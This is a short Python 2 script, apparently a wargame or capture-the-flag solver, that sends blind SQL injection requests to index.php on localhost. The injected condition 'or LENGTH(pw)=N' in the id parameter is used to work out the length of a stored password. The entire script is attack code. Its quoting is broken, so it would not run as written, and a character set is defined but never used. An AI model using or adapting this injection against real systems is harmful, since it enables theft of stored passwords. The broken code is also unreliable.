import httplib
import urllib
result=''
string="abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()_-=+"
target = 'localhost'
headers={'Cookie':'PHPSESSID=','Content-Type':'application/x-www-form-urlencoded'}
for i in range(1,100) :
    hh ='index.php?id=' or LENGTH(pw)='+str(i)+'%23'
    conn=httplib.HTTPConnection(target)
    conn.request('GET',hh,'',headers)
    data=conn.getresponse().read()
    print i
    if 'admins' in data:
        length = i
        print "inject length : "+str(i)
        break
